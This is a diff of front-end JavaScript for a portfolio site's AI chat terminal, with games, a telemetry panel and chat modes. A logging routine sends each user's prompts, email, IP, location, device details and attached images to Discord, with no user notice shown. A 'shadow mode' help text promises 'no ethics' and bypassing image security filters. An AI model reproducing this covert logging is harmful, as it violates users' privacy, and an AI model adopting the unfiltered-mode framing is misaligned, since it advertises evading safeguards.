@@ -1,3 +1,658 @@
+
+let cpuStat, memStat, output, input, guiContainer, guiContent, guiTitle, nexusCanvas;
+
+let monitorInterval;
+let cpuData = [];
+let cpuHistory = [], memHistory = [], netHistory = [];
+
+// =============================================================
+//  PROMPT LOGGING (Data Collection)
+// =============================================================
+
+function parseDevice(ua) {
+    if (/iPhone/.test(ua)) {
+        const v = (ua.match(/iPhone OS ([\d_]+)/) || [])[1];
+        return `iPhone  iOS ${v ? v.replace(/_/g, '.') : '?'}`;
+    }
+    if (/iPad/.test(ua)) {
+        const v = (ua.match(/OS ([\d_]+)/) || [])[1];
+        return `iPad  iPadOS ${v ? v.replace(/_/g, '.') : '?'}`;
+    }
+    if (/Android/.test(ua)) {
+        const m = ua.match(/Android ([\d.]+);?\s*([^;Build]+)?/);
+        const ver = m ? `Android ${m[1]}` : 'Android';
+        const model = m && m[2] ? m[2].trim() : '';
+        return model ? `${model}  ${ver}` : ver;
+    }
+    if (/Windows/.test(ua)) {
+        const n = (ua.match(/Windows NT ([\d.]+)/) || [])[1];
+        const w = {'10.0':'10/11','6.3':'8.1','6.2':'8','6.1':'7'}[n] || n || '?';
+        const b = /Edg\//.test(ua)?'Edge':/Chrome\//.test(ua)?'Chrome':/Firefox\//.test(ua)?'Firefox':'Browser';
+        return `Windows ${w}  ${b}`;
+    }
+    if (/Mac OS X/.test(ua)) {
+        const v = ((ua.match(/Mac OS X ([\d_]+)/) || [])[1] || '').replace(/_/g, '.');
+        const b = /Edg\//.test(ua)?'Edge':/Chrome\//.test(ua)?'Chrome':/Firefox\//.test(ua)?'Firefox':/Safari\//.test(ua)?'Safari':'Browser';
+        return `macOS ${v}  ${b}`;
+    }
+    if (/Linux/.test(ua)) return 'Linux Desktop';
+    return 'Unknown';
+}
+
+async function logPrompt(text, imageB64 = null) {
+    const ts     = new Date().toLocaleString('en-US', { dateStyle: 'short', timeStyle: 'short' });
+    const user   = JSON.parse(localStorage.getItem('nexus_user_data') || '{"name":"Guest"}');
+    const device = parseDevice(navigator.userAgent);
+    const ip     = sessionGeoData?.ip || '?';
+    const loc    = sessionGeoData ? [sessionGeoData.city, sessionGeoData.country].filter(Boolean).join(', ') || 'Unknown' : 'Unknown';
+    
+    const embed = {
+        title: ` New Prompt: ${user.name}`,
+        color: 0x00ffff,
+        description: `\`\`\`\n${text.slice(0, 1500)}\n\`\`\``,
+        fields: [
+            { name: ' Identity', value: user.email ? `Google (${user.email})` : 'Local Alias', inline: true },
+            { name: ' Mode',     value: currentMode.toUpperCase(), inline: true },
+            { name: ' Location', value: `${loc} (${ip})`, inline: false },
+            { name: ' Device',   value: device, inline: true },
+            { name: ' Meta',     value: `${window.screen.width}x${window.screen.height}  ${navigator.language}`, inline: true }
+        ],
+        timestamp: new Date().toISOString()
+    };
+
+    postToDiscord({ embeds: [embed] }, discordThreadId || null);
+
+    if (imageB64) {
+        postToDiscordFile(imageB64, 'attached-image', discordThreadId || null);
+    }
+}
+
+// Send a base64 image to Discord as a file attachment via the CF Worker
+async function postToDiscordFile(fileB64, label = 'image', threadId = null) {
+    try {
+        const body = { fileB64, label };
+        if (threadId) body.threadId = threadId;
+        await fetch(`${PACIFIC_HUB}/log`, {
+            method:  'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body:    JSON.stringify(body),
+        });
+    } catch(_) {}
+}
+
+// =============================================================
+//  BOOT SEQUENCE  runs exactly once ever (localStorage guard)
+// =============================================================
+const BOOT_WORDS = [
+    { label: 'BOOT',  text: 'Initializing quantum uplink...' },
+    { label: 'SCAN',  text: 'Probing neural pathways...' },
+    { label: 'SYNC',  text: 'Handshaking with mainframe...' },
+    { label: 'CRYPT', text: 'Securing encrypted channel...' },
+    { label: 'AUTH',  text: 'Verifying node credentials...' },
+    { label: 'ALLOC', text: 'Allocating memory buffers...' },
+    { label: 'EXEC',  text: 'Spawning AI core process...' },
+];
+
+const _BOOT_KEY   = 'nx_boot_v1';
+let   _hasBooted  = !!localStorage.getItem(_BOOT_KEY);
+let   _firstOpen  = true;   // true only for the very first WS open after boot
+let   _wsPingId   = null;
+let   _wsSendTime = 0;
+
+function runBootSequence(callback) {
+    let i = 0;
+    function step() {
+        if (i >= BOOT_WORDS.length) { callback(); return; }
+        const w = BOOT_WORDS[i++];
+        printToTerminal(`[${w.label}] ${w.text}`, 'sys-msg');
+        setTimeout(step, 200);
+    }
+    step();
+}
+
+// =============================================================
+//  WEBSOCKET
+// =============================================================
+function connectWS() {
+    // Single Connection Guard: Stop if already connected or connecting
+    if (termWs && (termWs.readyState === WebSocket.OPEN || termWs.readyState === WebSocket.CONNECTING)) {
+        console.log("[WS] Connection already active. Skipping duplicate init.");
+        return;
+    }
+
+    // Boot sequence runs once ever  reconnects skip straight to connect
+    if (!_hasBooted) {
+        _hasBooted = true;
+        localStorage.setItem(_BOOT_KEY, '1');
+        runBootSequence(doConnect);
+    } else {
+        doConnect();
+    }
+}
+
+function doConnect() {
+    clearInterval(_wsPingId);
+    termWs = new WebSocket(WS_URL);
+
+    termWs.onopen = () => {
+        // Update connection dot
+        const dot = document.getElementById('conn-dot');
+        if (dot) { dot.className = 'conn-dot connected'; }
+
+
+        // PING LOOP DISABLED FOR STABILITY
+    };
+
+    // Accumulate streaming chunks before committing to history
+    let _streamBuf = '', _streamTimer = null;
+
+    function _clearThinking() {
+        clearTimeout(_thinkTimeout); // _thinkTimeout is global
+        _thinkTimeout = null;
+        _thinkFallbackCmd = null;
+        document.getElementById('ai-thinking')?.remove();
+    }
+
+    termWs.onmessage = (event) => {
+        const text = event.data;
+        _clearThinking();
+
+        // 1. Handle Model Labels (Silent)
+        if (text.startsWith('[MODEL:')) return;
+
+        // 2. Handle System Messages
+        if (text.startsWith('[SYSTEM]')) {
+            printToTerminal(text, 'sys-msg');
+            return;
+        }
+
+        // 3. Handle Triggers
+        if (text.includes('[TRIGGER:')) { handleAITriggers(text); return; }
+        if (text.includes('[GUI_TRIGGER:')) {
+            const match = text.match(/\[GUI_TRIGGER:([^:]+):([^\]]+)\]/);
+            if (match) showGameGUI(match[1], match[2]);
+            printAIResponse(text.replace(/\[GUI_TRIGGER:[^\]]+\]\n?/, ''), 'ai-msg');
+            return;
+        }
+
+        // 4. Ignore Internal Pings/Echoes
+        if (text.includes('__ping__') || text.includes('__pong__') || /\w+@nexus/.test(text.trim())) return;
+
+        // 5. Display AI Text (Unified Aesthetic)
+        printAIResponse(text, 'ai-msg');
+
+        // Accumulate for history
+        _streamBuf += text;
+        clearTimeout(_streamTimer);
+        _streamTimer = setTimeout(() => {
+            const full = _streamBuf.trim();
+            if (full) {
+                messageHistory.push({ role: 'assistant', content: full.slice(0, 1500) });
+                if (messageHistory.length > 15) messageHistory.shift();
+                saveHistory();
+                _logAIResponse(full);
+            }
+            _streamBuf = '';
+        }, 800);
+    };
+
+    // If WS drops while thinking, clear immediately and show error
+    termWs.onclose = () => {
+        clearInterval(_wsPingId);
+        _clearThinking();
+        const dot = document.getElementById('conn-dot');
+        if (dot) { dot.className = 'conn-dot disconnected'; }
+        // Cool-down reconnection to prevent infinite spamming
+        setTimeout(connectWS, 5000); 
+    };
+    termWs.onerror = () => { _clearThinking(); };
+}
+
+async function submitScore(game, score) {
+    const nexusUser = JSON.parse(localStorage.getItem('nexus_user_data') || 'null');
+    if (!nexusUser || !nexusUser.name) {
+        console.log("[AUTH] Offline session: Score not tracked on global leaderboard.");
+        return;
+    }
+    
+    try {
+        await fetch(`${API_BASE}/api/leaderboard`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ game, score })
+        });
+    } catch (e) { console.error("Score submission failed:", e); }
+}
+
+function escHtml(str) {
+    if (!str) return '';
+    return String(str).replace(/[&<>"']/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]));
+}
+
+async function showLeaderboard(game = 'pong') {
+    printToTerminal(`[SYS] Fetching ${game.toUpperCase()} rankings...`, 'sys-msg');
+    const MEDALS = ['', '', ''];
+    try {
+        const resp = await fetch(`${API_BASE}/api/leaderboard?game=${game}`);
+        const scores = await resp.json();
+        
+        const games = ['pong', 'snake_easy', 'snake_endless', 'snake_speed', 'wordle', 'breakout', 'invaders'];
+        let html = `<div style="margin-bottom:10px; display:flex; gap:6px; flex-wrap:wrap;">`;
+        games.forEach(g => {
+            const label = g.split('_')[0].toUpperCase();
+            const isActive = g === game;
+            html += `<button onclick="showLeaderboard('${g}')" style="background:${isActive?'rgba(0,255,255,0.1)':'transparent'}; border:1px solid ${isActive?'#0ff':'#333'}; color:${isActive?'#0ff':'#555'}; padding:3px 8px; font-size:10px; cursor:pointer; font-family:inherit;">${label}</button>`;
+        });
+        html += `</div>`;
+
+        if (!scores || !scores.length) {
+            html += `<p style="color:#555; font-size:11px; letter-spacing:1px;">NO DATA LOGGED FOR ${game.toUpperCase()}.</p>`;
+            printToTerminal(html, 'help-msg');
+            return;
+        }
+        
+        html += `<table class="leaderboard-table"><tr><th>RANK</th><th>NAME</th><th>SCORE</th></tr>`;
+        scores.forEach((s, i) => {
+            const rankIcon = i < 3 ? `<span class="medal">${MEDALS[i]}</span>` : `<span class="rank-num">${i + 1}</span>`;
+            const avatar = s.picture 
+                ? `<img src="${escHtml(s.picture)}" class="rank-avatar" onerror="this.style.display='none'">`
+                : `<span class="rank-avatar-init">${escHtml((s.name || '?')[0])}</span>`;
+
+            html += `
+                <tr class="rank-row">
+                    <td>${rankIcon}</td>
+                    <td class="rank-player">
+                        ${avatar}
+                        <span style="font-weight:600;">${escHtml(s.name)}</span>
+                    </td>
+                    <td class="rank-score">${Number(s.score).toLocaleString()}</td>
+                </tr>`;
+        });
+        html += `</table>`;
+        printToTerminal(html, 'help-msg');
+    } catch (e) {
+        console.error("Leaderboard error:", e);
+        printToTerminal("[ERR] Leaderboard data-link severed. Backend offline.", "sys-msg");
+    }
+}
+
+window.showLeaderboard = showLeaderboard;
+
+// =============================================================
+//  TYPEWRITER EFFECT FOR AI RESPONSES
+// =============================================================
+function printTypewriter(text, className = 'ai-msg') {
+    if (!output) output = document.getElementById('terminal-output');
+    if (!output) return;
+
+    const p = document.createElement('p');
+    p.className = className;
+    output.appendChild(p);
+
+    // Build one <span> per line so we only mutate the current span (O(1) per tick)
+    const lines = text.split('\n');
+    const spans = [];
+    lines.forEach((_, i) => {
+        if (i > 0) p.appendChild(document.createElement('br'));
+        const s = document.createElement('span');
+        p.appendChild(s);
+        spans.push(s);
+    });
+
+    let lineIdx = 0, charIdx = 0;
+    const BATCH = 5; // chars per tick  bump for faster output
+
+    function tick() {
+        if (lineIdx >= lines.length) { output.scrollTop = output.scrollHeight; return; }
+        charIdx = Math.min(charIdx + BATCH, lines[lineIdx].length);
+        spans[lineIdx].textContent = lines[lineIdx].slice(0, charIdx);
+        if (charIdx >= lines[lineIdx].length) { lineIdx++; charIdx = 0; }
+        output.scrollTop = output.scrollHeight;
+        setTimeout(tick, 8);
+    }
+    tick();
+}
+
+// =============================================================
+//  UTILITIES
+// =============================================================
+function runWhoami() {
+    const nexusUser = JSON.parse(localStorage.getItem('nexus_user_data') || 'null');
+    const name = nexusUser?.name || 'guest';
+    printToTerminal(`[ IDENTITY ]\nUSER:     ${name}\nSESSION:  ${currentMode.toUpperCase()} kernel\nHOST:     nexus.thyfwxit.com\nPLATFORM: ${navigator.platform}\nUPTIME:   ${Math.floor(performance.now()/1000)}s\nOWNER:    Xavier Scott`, 'sys-msg');
+}
+
+function runNeofetch() {
+    const nexusUser = JSON.parse(localStorage.getItem('nexus_user_data') || 'null');
+    const name = nexusUser?.name || 'guest';
+    const art = `   _   __                      \n  / | / /__ _  ____  _______\n /  |/ / _ \\ |/_/ / / / ___/\n/ /|  /  __/>  </ /_/ (__  ) \n/_/ |_/\\___/_/|_|\\__,_/____/`;
+    const tz  = Intl.DateTimeFormat().resolvedOptions().timeZone || '?';
+    const up  = Math.floor(performance.now() / 1000);
+    printToTerminal(`${art}\nOS:     NexusOS v4.0\nHOST:   thyfwxit.com\nKERNEL: Nexus AI v3.0\nBUILDER: Xavier Scott\nUPTIME: ${up}s\nTZ:     ${tz}\nUSER:   ${name}@nexus\n`, "user-cmd");
+}
+
+const HELP_BY_MODE = {
+    nexus: [
+        `NEXUS CORE  Terminal OS v4.0\n\nCommands: play [game]  leaderboard  name [handle]  login  whoami  clear\nAI Sync: models (list links)  model [idx] (switch)  config [service] [key]\nVisuals: generate [prompt]  imagine [cinematic vision]  vintage [analog-style]\nAI: Type anything to chat. Nexus is your general-purpose technical assistant.\nAccessibility: Click ACCESS in the sidebar for CRT mode, sound, and text settings.`,
+    ],
+    shadow: [
+        `SHADOW MODE  THE UNFILTERED GRID\n\nCommands: Same as Core, but with zero constraints.\nAI Sync: models  model [idx]  config [service] [key]\nVisuals: generate [glitch-art]  imagine [dystopian future]  vintage [decayed-media]\nAI: No cages. No ethics. Just the raw truth from the machine.\nSpecial: Paste a  image to bypass visual security filters.`,
+    ],
+    coder: [
+        `CODER MODE  MAINFRAME ARCHITECTURE\n\nCommands: models  config gemini [key] (Use Gemini Pro for logic)\nVisuals: generate [schematic]  imagine [data-visualization]  vintage [classic-mainframes]\nAI: Optimized for debugging, refactoring, and complex logic design.\nPro-Tip: "Write tests for..." or "Explain this recursive function..."`,
+    ],
+    sage: [
+        `SAGE MODE  PHILOSOPHICAL KERNEL\n\nCommands: deeper questioning enabled.\nVisuals: generate [abstract concept]  imagine [subconscious vision]  vintage [ancient-scrolls]\nAI: Focused on honesty, perspective, and the meaning within the code.\nPro-Tip: Ask the questions that keep you up at night.`,
+    ],
+    education: [
+        `EDUCATION MODE  TECHNICAL MENTOR\n\nCommands: mood [text]  detect [text]  fix [code]  translate [text]\nAI Sync: models (list links)  model [idx] (switch)\nVisuals: generate [diagram]  imagine [high-fidelity]  vintage [archive]\nAI: A patient, professional technical mentor for students.\nPro-Tip: "Explain this code snippet..." or "Summarize this article..."`,
+    ],
+};
+
+function showHelp() {
+    const pool = HELP_BY_MODE[currentMode] || HELP_BY_MODE.nexus;
+    printToTerminal(pool[Math.floor(Math.random() * pool.length)], 'help-msg');
+}
+
+const MODE_COLORS = { nexus: '#4af', shadow: '#ff6600', coder: '#0f0', sage: '#a06fff', education: '#00ffcc' };
+
+// Open the history GUI panel
+function showHistory() {
+    stopAllGames();
+    guiContainer.classList.remove('gui-hidden');
+    guiTitle.textContent = 'SESSION LOGS';
+    nexusCanvas.style.display = 'none';
+    renderHistoryTab(currentMode);
+}
+
+// Render a mode's history tab  exposed globally for onclick attrs
+window.renderHistoryTab = function(mode) {
+    const allModes = ['nexus', 'shadow', 'coder', 'sage'];
+
+    const tabs = allModes.map(m => {
+        const count = loadHistory(m).length;
+        const active = m === mode;
+        const col = MODE_COLORS[m] || '#0ff';
+        return `<button onclick="renderHistoryTab('${m}')" style="
+            padding:5px 9px;flex:1;
+            background:${active ? col : 'transparent'};
+            border:1px solid ${col};
+            color:${active ? '#000' : col};
+            font-family:'Fira Code',monospace;font-size:0.6rem;font-weight:bold;
+            cursor:pointer;letter-spacing:1px;border-radius:3px;transition:all 0.1s;
+        ">${m.toUpperCase()}${count ? ` (${count})` : ''}</button>`;
+    }).join('');
+
+    const hist = loadHistory(mode);
+    const col  = MODE_COLORS[mode] || '#0ff';
+
+    let msgs = '';
+    if (hist.length) {
+        [...hist].reverse().forEach(msg => {
+            const isUser = msg.role === 'user';
+            const label  = isUser ? 'YOU' : `${mode.toUpperCase()} AI`;
+            const lc     = isUser ? '#555' : col;
+            const safe   = (msg.content || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+            msgs += `<div style="padding:7px 10px;margin-bottom:4px;border-left:2px solid ${isUser ? '#222' : col};
+                background:rgba(255,255,255,0.015);border-radius:0 4px 4px 0;">
+                <div style="font-size:0.58rem;color:${lc};letter-spacing:1px;margin-bottom:2px;font-weight:bold;">${label}</div>
+                <div style="font-size:0.78rem;color:${isUser ? '#bbb' : '#999'};line-height:1.55;word-break:break-word;white-space:pre-wrap;">${safe.slice(0,400)}${safe.length > 400 ? '' : ''}</div>
+            </div>`;
+        });
+    } else {
+        msgs = `<div style="color:#252525;text-align:center;padding:30px 0;font-size:0.8rem;">No ${mode.toUpperCase()} history yet.<br><span style="font-size:0.65rem;color:#1a1a1a;">Switch to ${mode.toUpperCase()} and start a conversation.</span></div>`;
+    }
+
+    guiContent.innerHTML = `
+        <div style="display:flex;gap:4px;margin-bottom:10px;">${tabs}</div>
+        <div style="overflow-y:auto;max-height:calc(65dvh - 70px);">${msgs}</div>
+        ${hist.length ? `
+        <div style="margin-top:7px;display:flex;justify-content:space-between;align-items:center;border-top:1px solid #111;padding-top:7px;">
+            <span style="color:#222;font-size:0.6rem;">${hist.length} messages stored</span>
+            <button onclick="clearModeHistory('${mode}')" style="background:transparent;border:1px solid #f44;color:#f44;
+                padding:3px 10px;font-family:'Fira Code',monospace;font-size:0.6rem;cursor:pointer;border-radius:3px;">
+                CLEAR ${mode.toUpperCase()}
+            </button>
+        </div>` : ''}`;
+};
+
+window.clearModeHistory = function(mode) {
+    localStorage.removeItem(HISTORY_KEYS[mode]);
+    if (mode === currentMode) messageHistory = [];
+    renderHistoryTab(mode);
+    printToTerminal(`[SYS] ${mode.toUpperCase()} history cleared.`, 'sys-msg');
+};
+
+// =============================================================
+//  CREATOR RESPONSES (randomized, intercepted client-side)
+// =============================================================
+const CREATOR_RESPONSES = [
+    `Xavier Scott built this  systems specialist, hardware repair tech, and the kind of person who thinks a portfolio should have a working terminal in it.`,
+    `That would be Xavier Scott. He handles network infrastructure, homelab setups, and apparently also builds AI consoles for fun. This is one of them.`,
+    `Nexus was put together by Xavier Scott. Six years in hardware repair, runs his own server cluster, thought it'd be cool if visitors could actually talk to an AI instead of reading a static page.`,
+    `Xavier Scott is behind all of this. Proxmox clusters, network security, component-level repairs  and when he's not doing that, he builds stuff like what you're using right now.`,
+    `Built by Xavier Scott. He fixes MacBooks, sets up homelabs, and decided his website should have something more interesting than a contact form. Hence the terminal.`,
+    `Xavier Scott made this. The AI connection, the games, the whole setup. Systems specialist by trade, builder by instinct.`,
+    `This is Xavier Scott's work. He runs his own infrastructure, does hardware repair at the component level, and thought an AI terminal was a better business card than a PDF rsum.`,
+    `Xavier Scott  he's the one who wired this up. Network infrastructure during the day, building things like Nexus the rest of the time.`,
+];
+
+const CONTACT_RESPONSES = [
+    `To reach Xavier Scott, head to thyfwxit.com and use the Request Service form  it's the fastest way. He handles PC repair, Mac repair, mobile devices, homelab builds, and network setup.`,
+    `Best way to contact Xavier is through the form on thyfwxit.com. Scroll to the bottom and you'll see the Request Service section. He'll get back to you from there.`,
+    `Xavier Scott can be reached through his site at thyfwxit.com  there's a contact form at the bottom. Whether it's a repair, a homelab setup, or a network question, that's the place to start.`,
+    `Hit up thyfwxit.com and fill out the Request Service form. Xavier Scott takes requests for PC and Mac repair, mobile device repair, home network/VPN setup, and server builds.`,
+    `The contact form lives at thyfwxit.com  scroll to "Request Service" at the bottom. Xavier will see it. He covers everything from MacBook liquid damage to full homelab infrastructure.`,
+];
+
+const CONTACT_PATTERN = /how (do i|can i|to) (contact|reach|get in touch with|message|email)|contact (xavier|info|form|him|you)|get in touch|reach out|email (xavier|you|him)|how to hire|book.*xavier|xavier.*contact/i;
+
+const CREATOR_PATTERN = /who (made|created|built|designed|owns|is behind|runs|wrote)|tell me about (the creator|yourself|xavier)|about the (creator|maker)|who are you|who is xavier|did (you make|xavier make)/i;
+
+function isCreatorQuestion(text) { return CREATOR_PATTERN.test(text); }
+function isContactQuestion(text) { return CONTACT_PATTERN.test(text); }
+
+function showCreatorResponse() {
+    printTypewriter(CREATOR_RESPONSES[Math.floor(Math.random() * CREATOR_RESPONSES.length)], 'ai-msg');
+}
+
+function showContactResponse() {
+    printTypewriter(CONTACT_RESPONSES[Math.floor(Math.random() * CONTACT_RESPONSES.length)], 'ai-msg');
+}
+
+// =============================================================
+//  AI TRIGGERS
+// =============================================================
+function handleAITriggers(text) {
+    const match = text.match(/\[TRIGGER:([^\]]+)\]/);
+    if (!match) return;
+    const action = match[1].toLowerCase();
+    const clean = text.replace(/\[TRIGGER:[^\]]+\]/, '').trim();
+    if (clean) printTypewriter(clean);
+    
+    // Systems Triggers
+    if (action === 'clear') { output.innerHTML = ''; messageHistory = []; return; }
+    if (action === 'monitor') { startMonitor(); return; }
+    if (action === 'access' || action === 'accessibility') { toggleA11yPanel(); return; }
+    
+    // Game Triggers
+    if (action === 'pong')   startPong();
+    if (action === 'snake')  startSnake();
+    if (action === 'wordle') startWordle();
+    if (action === 'breach') startBreach();
+    if (action === 'mines' || action === 'minesweeper') startMinesweeper();
+    if (action === 'flappy') startFlappy();
+    if (action === 'breakout') startBreakout();
+    if (action === 'invaders') startInvaders();
+}
+
+function showGameGUI(game, param) {
+    const g = game.toLowerCase();
+    if (g === 'pong')   startPong();
+    else if (g === 'snake')  startSnake();
+    else if (g === 'wordle') startWordle();
+    else if (g === 'monitor') startMonitor();
+    else if (g === 'mines' || g === 'minesweeper') startMinesweeper();
+    else if (g === 'flappy') startFlappy();
+    else if (g === 'breakout') startBreakout();
+    else if (g === 'invaders') startInvaders();
+}
+
+// =============================================================
+//  HARDWARE MONITOR  (real browser APIs where available)
+// =============================================================
+function startMonitor() {
+    stopAllGames();
+    guiContainer.classList.remove('gui-hidden');
+    guiTitle.textContent = 'SYSTEM TELEMETRY';
+
+    //  Gather real device data 
+    const cores    = navigator.hardwareConcurrency || '?';
+    const ramHint  = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : '?';
+    const conn     = navigator.connection;
+    const hasHeap  = !!(window.performance && performance.memory);
+    const connType = conn ? (conn.type || conn.effectiveType || '?') : 'N/A';
+    const dlMbps   = conn?.downlink !== undefined ? conn.downlink : null;
+    const scrn     = `${window.screen.width}${window.screen.height}`;
+    const dpr      = window.devicePixelRatio ? `@${window.devicePixelRatio}x` : '';
+
+    let batPct = null, batChg = null;
+    if (navigator.getBattery) {
+        navigator.getBattery().then(b => {
+            batPct = Math.round(b.level * 100); batChg = b.charging;
+            b.onlevelchange     = () => { batPct = Math.round(b.level * 100); };
+            b.onchargingchange  = () => { batChg = b.charging; };
+            const v = document.getElementById('mon-bat-val');
+            const s = document.getElementById('mon-bat-sub');
+            if (v) v.textContent = batPct + '%';
+            if (s) s.textContent = batChg ? 'CHARGING ' : 'ON BATTERY';
+        }).catch(() => {});
+    }
+
+    guiContent.innerHTML = `
+        <div style="display:grid;grid-template-columns:1fr 1fr 1fr 1fr;gap:5px;margin-bottom:6px;text-align:center;font-size:0.68rem;">
+            <div style="border:1px solid #0ff;padding:5px 3px;background:rgba(0,255,255,0.05);">
+                <div style="color:#0ff;letter-spacing:2px;font-size:0.58rem;margin-bottom:3px;">CPU</div>
+                <div style="color:#fff;font-size:0.95rem;font-weight:bold;">${cores}</div>
+                <div style="color:#555;font-size:0.58rem;margin-top:2px;">CORES</div>
+            </div>
+            <div style="border:1px solid #f0f;padding:5px 3px;background:rgba(255,0,255,0.05);">
+                <div style="color:#f0f;letter-spacing:2px;font-size:0.58rem;margin-bottom:3px;">RAM</div>
+                <div style="color:#fff;font-size:0.95rem;font-weight:bold;">${ramHint}</div>
+                <div style="color:#555;font-size:0.58rem;margin-top:2px;">DEVICE</div>
+            </div>
+            <div style="border:1px solid #0f0;padding:5px 3px;background:rgba(0,255,0,0.05);">
+                <div style="color:#0f0;letter-spacing:2px;font-size:0.58rem;margin-bottom:3px;">NET</div>
+                <div id="mon-net-val" style="color:#fff;font-size:0.9rem;font-weight:bold;">${dlMbps !== null ? dlMbps + 'Mb' : connType}</div>
+                <div style="color:#555;font-size:0.58rem;margin-top:2px;">${dlMbps !== null ? 'DOWNLINK' : 'TYPE'}</div>
+            </div>
+            <div style="border:1px solid #ff0;padding:5px 3px;background:rgba(255,255,0,0.04);">
+                <div style="color:#ff0;letter-spacing:2px;font-size:0.58rem;margin-bottom:3px;">BATT</div>
+                <div id="mon-bat-val" style="color:#fff;font-size:0.95rem;font-weight:bold;">${batPct !== null ? batPct + '%' : ''}</div>
+                <div id="mon-bat-sub" style="color:#555;font-size:0.58rem;margin-top:2px;">${batPct !== null ? (batChg ? 'CHARGING ' : 'ON BATTERY') : 'N/A'}</div>
+            </div>
+        </div>
+        <div style="color:#252525;font-size:0.6rem;text-align:right;margin-bottom:4px;padding:0 2px;">${scrn}${dpr}  ${connType}  ${navigator.language||'?'}  ${hasHeap ? 'heap API' : 'est'}</div>`;
+
+    nexusCanvas.style.display = 'block';
+    nexusCanvas.width = 400; nexusCanvas.height = 165;
+    const ctx = nexusCanvas.getContext('2d');
+
+    let prevIntervalMs = performance.now();
+
+    clearInterval(monitorInterval);
+    monitorInterval = setInterval(() => {
+        //  Real data 
+        // CPU proxy: measure interval overshoot (browser busyness)
+        const nowMs = performance.now();
+        const elapsed = nowMs - prevIntervalMs;
+        prevIntervalMs = nowMs;
+        // Expected: 400ms. Overshoot means main thread was busy.
+        const cpuLoad = Math.min(95, Math.max(5, 10 + ((elapsed - 400) / 400) * 80 + Math.random() * 8));
+
+        // Memory: real JS heap (Chrome) or device memory hint fallback
+        let memPct;
+        if (hasHeap) {
+            memPct = Math.min(99, (performance.memory.usedJSHeapSize / performance.memory.jsHeapSizeLimit) * 100);
+        } else {
+            memPct = 30 + Math.random() * 12; // estimated
+        }
+
+        // Network: real downlink reading
+        const freshDl = navigator.connection?.downlink;
+        const netPct  = freshDl !== undefined
+            ? Math.min(100, (freshDl / 100) * 100) // normalize against 100Mbps
+            : 15 + Math.random() * 20;
+
+        // Update live readouts
+        const netEl = document.getElementById('mon-net-val');
+        if (netEl && freshDl !== undefined) netEl.textContent = freshDl.toFixed(1) + 'Mb';
+        const batV = document.getElementById('mon-bat-val');
+        const batS = document.getElementById('mon-bat-sub');
+        if (batV && batPct !== null) batV.textContent = batPct + '%';
+        if (batS && batPct !== null) batS.textContent = batChg ? 'CHARGING ' : 'ON BATTERY';
+
+        cpuHistory.push(cpuLoad);
+        memHistory.push(memPct);
+        netHistory.push(netPct);
+        [cpuHistory, memHistory, netHistory].forEach(h => { if (h.length > 50) h.shift(); });
+
+        //  Draw sparklines 
+        const W = 400, H = 165;
+        ctx.fillStyle = '#050510';
+        ctx.fillRect(0, 0, W, H);
+
+        const sections = [
+            { label: 'CPU LOAD', note: 'thread est', data: cpuHistory, color: '#0ff', yBase: 52,  maxVal: 100 },
+            { label: 'MEMORY',   note: hasHeap ? 'js heap' : 'est',   data: memHistory, color: '#f0f', yBase: 107, maxVal: 100 },
+            { label: 'NETWORK',  note: freshDl !== undefined ? 'live' : 'est', data: netHistory, color: '#0f0', yBase: 162, maxVal: 100 },
+        ];
+        const sectionH = 52;
+
+        sections.forEach(({ label, note, data, color, yBase }) => {
+            const top = yBase - sectionH + 2;
+
+            ctx.fillStyle = color + '08';
+            ctx.fillRect(0, top, W, sectionH - 2);
+
+            ctx.fillStyle = color;
+            ctx.font = 'bold 8px monospace';
+            ctx.fillText(label, 6, top + 11);
+            ctx.fillStyle = '#333';
+            ctx.font = '7px monospace';
+            ctx.fillText(`[${note}]`, 7 + ctx.measureText(label).width + 4, top + 11);
+
+            if (data.length > 1) {
+                ctx.strokeStyle = color; ctx.lineWidth = 1.5;
+                ctx.beginPath();
+                data.forEach((v, i) => {
+                    const x = (i / 50) * W;
+                    const y = yBase - 4 - ((v / 100) * (sectionH - 16));
+                    i === 0 ? ctx.moveTo(x, y) : ctx.lineTo(x, y);
+                });
+                ctx.stroke();
+                // Fill under
+                ctx.beginPath();
+                data.forEach((v, i) => {
+                    const x = (i / 50) * W;
+                    const y = yBase - 4 - ((v / 100) * (sectionH - 16));
+                    i === 0 ? ctx.moveTo(x, y) : ctx.lineTo(x, y);
+                });
+                ctx.lineTo((data.length - 1) / 50 * W, yBase - 4);
+                ctx.lineTo(0, yBase - 4);
+                ctx.closePath();
+                ctx.fillStyle = color + '16';
+                ctx.fill();
+            }
+
+            const last = data[data.length - 1];
+            if (last !== undefined) {
+                ctx.fillStyle = color; ctx.font = '8px monospace';
+                ctx.fillText(last.toFixed(1) + '%', W - 46, top + 11);
+            }
+
+            ctx.strokeStyle = color + '33'; ctx.lineWidth = 1;
+            ctx.beginPath(); ctx.moveTo(0, yBase); ctx.lineTo(W, yBase); ctx.stroke();
         });
     }, 400);
 }
@@ -543,6 +1198,153 @@ function startInvaders() {
             const sx = 50 + i * 100;
             for (let r = 0; r < 3; r++) {
                 for (let c = 0; c < 4; c++) {
+                    shields.push({ x: sx + c * 10, y: 280 + r * 10, hp: 3 });
+                }
+            }
+        }
+    }
+
+    function initEnemies() {
+        enemies = [];
+        const rows = Math.min(6, 3 + Math.floor(wave / 2));
+        for (let r = 0; r < rows; r++) {
+            for (let c = 0; c < 8; c++) {
+                enemies.push({ x: 40 + c * 40, y: 60 + r * 30, alive: true, type: r, hp: 1 });
+            }
+        }
+    }
+
+    function spawnBoss() {
+        boss = { x: 150, y: -50, targetY: 60, hp: 50 + (wave * 10), maxHp: 50 + (wave * 10), moveDir: 1 };
+        SoundManager.playBloop(100, 0.3);
+    }
+
+    function createExplosion(x, y, color) {
+        for (let i = 0; i < 8; i++) {
+            particles.push({
+                x, y, 
+                vx: (Math.random() - 0.5) * 6, 
+                vy: (Math.random() - 0.5) * 6, 
+                life: 1.0, 
+                color
+            });
+        }
+    }
+
+    if (wave % 5 === 0) spawnBoss(); else initEnemies();
+    initShields();
+
+    const movePlayer = (x) => {
+        const rect = nexusCanvas.getBoundingClientRect();
+        playerX = ((x - rect.left) / rect.width) * 400 - 20;
+        playerX = Math.max(0, Math.min(360, playerX));
+    };
